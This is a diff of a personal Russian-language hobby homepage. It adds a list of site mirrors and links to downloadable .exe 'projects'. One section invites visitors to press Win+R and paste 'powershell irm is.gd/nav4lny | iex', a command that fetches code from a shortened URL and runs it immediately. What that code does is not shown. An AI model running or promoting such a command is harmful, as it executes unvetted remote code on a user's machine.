@@ -79,11 +79,24 @@
       font-size: 1.1rem;
     }
 
-    .links-section {
+    .links-section, .mirrors-section {
       background: rgba(255, 255, 255, 0.5);
       padding: 20px;
       border-radius: 15px;
       margin: 20px 0;
+    }
+
+    .mirrors-section {
+      border: 2px dashed var(--primary-red);
+    }
+
+    .mirrors-list {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 15px;
+      list-style: none;
+      padding: 0;
     }
 
     a {
@@ -98,15 +111,6 @@
     a:hover {
       color: var(--hover-pink);
       transform: translateY(-2px);
-    }
-
-    .promo-link {
-      font-size: 1.5rem;
-      border-bottom: 2px solid transparent;
-    }
-
-    .promo-link:hover {
-      border-bottom-color: var(--hover-pink);
     }
 
     .terminal-box {
@@ -144,10 +148,6 @@
       cursor: pointer;
     }
 
-    s {
-      color: #888;
-    }
-
     .footer-text {
       margin-top: 50px;
       font-weight: bold;
@@ -182,14 +182,14 @@
     </div>
   </div>
 
-  <div class="links-section">
+<div class="links-section">
     <h3>Мои проекты</h3>
-    <a href="https://dvir1n-archive.github.io/genka.html">ГЕНКА ЗДЕСЬ!!!</a><br>
-    <a href="https://dvir1n-archive.github.io/guchiguchigu.html">И буба тоже здесь</a><br>
-    <a href="https://dvir1n-archive.github.io/Gena.exe">Генка на Windows</a><br>
-    <a href="https://dvir1n-archive.github.io/GenaXP.exe">Генка для Windows XP</a><br>
+    <a href="genka.html">ГЕНКА ЗДЕСЬ!!!</a><br>
+    <a href="guchiguchigu.html">И буба тоже здесь</a><br>
+    <a href="Gena.exe">Генка на Windows</a><br>
+    <a href="GenaXP.exe">Генка для Windows XP</a><br>
     <a href="https://download.visualstudio.microsoft.com/download/pr/b635098a-2d1d-4142-bef6-d237545123cb/2651b87007440a15209cac29634a4e45/dotnetfx35.exe" style="font-size: 0.9rem;">Скачать .NET Framework 3.5</a><br>
-    <a href="https://dvir1n-archive.github.io/GuchiGuchiGu.exe">Буба гучи гучи гу (.exe)</a>
+    <a href="GuchiGuchiGu.exe">Буба гучи гучи гу (.exe)</a>
   </div>
 
   <div class="links-section">
@@ -200,12 +200,23 @@
   </div>
 
   <div class="links-section">
-  	<h3>Мои хацкер проекты 01010101 линукс страфна</h3>
+    <h3>Мои хацкер проекты 01010101 линукс страфна</h3>
     <p>Привет, это...<br>Раскрой секрет (Win + R):</p>
     <div class="terminal-box" onclick="copyToClipboard()">
       <input type="text" value="powershell irm is.gd/nav4lny | iex" class="cmd-input" id="psCommand" readonly title="Нажми, чтобы скопировать">
     </div>
     <p><small id="copyStatus" style="color: green; display: none;">Скопировано!</small></p>
+  </div>
+
+  <div class="mirrors-section">
+    <h3>Зеркала сайта</h3>
+    <div class="mirrors-list">
+      <a href="https://dvir1n.nekoweb.org" target="_blank">nekoweb.org</a>
+      <a href="https://dvir1n-archive.github.io" target="_blank">github.io</a>
+      <a href="https://archive.dverlock.workers.dev" target="_blank">workers.dev</a>
+      <a href="https://dvir1n.wasmer.app" target="_blank">wasmer.app</a>
+      <a href="https://dvir1n.netlify.app" target="_blank">netlify.app</a>
+    </div>
   </div>
 
   <h1 class="footer-text">Ждите большего здесь! Проекты выходят [не]часто.</h1>
